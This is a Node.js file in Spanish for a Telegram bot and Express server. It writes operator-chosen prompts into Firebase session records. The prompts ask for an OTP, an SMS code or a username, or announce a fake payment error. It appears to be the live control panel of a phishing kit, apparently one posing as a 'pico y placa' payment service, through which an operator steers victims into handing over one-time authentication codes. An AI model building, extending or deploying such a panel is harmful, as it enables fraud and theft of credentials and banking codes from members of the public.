
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const admin = require("firebase-admin");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
app.use(bodyParser.json());

// 🔐 Reemplaza con tu token real
const TELEGRAM_TOKEN = "TU_TELEGRAM_BOT_TOKEN";
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// 🔐 Reemplaza con tu configuración real de Firebase
admin.initializeApp({
  credential: admin.credential.applicationDefault(),
  databaseURL: "https://pico-y-placa-69eec-default-rtdb.firebaseio.com/"
});

const db = admin.database();

const opciones = [
  { label: "Solicitar OTP", value: "Por favor ingrese el código OTP." },
  { label: "Solicitar SMS", value: "Ingrese el código recibido por SMS." },
  { label: "Solicitar Usuario", value: "Escriba su nombre de usuario." },
  { label: "Error en el pago", value: "Hubo un error en su pago. Intente nuevamente." }
];

// Comando para iniciar sesión con un cliente
bot.onText(/\/cliente (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const sessionId = match[1];

  const keyboard = opciones.map(opt => [{
    text: opt.label,
    callback_data: JSON.stringify({ sessionId, message: opt.value })
  }]);

  bot.sendMessage(chatId, `Conectado al cliente \\`${sessionId}\\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  });
});

// Cuando se presiona un botón
bot.on("callback_query", async query => {
  const { sessionId, message } = JSON.parse(query.data);

  await db.ref(`sesiones/${sessionId}`).set({
    mensaje: message,
    timestamp: Date.now()
  });

  bot.answerCallbackQuery(query.id, { text: "Mensaje enviado al cliente ✅" });
});

// Iniciar servidor (opcional)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor backend corriendo en puerto ${PORT}`);
});
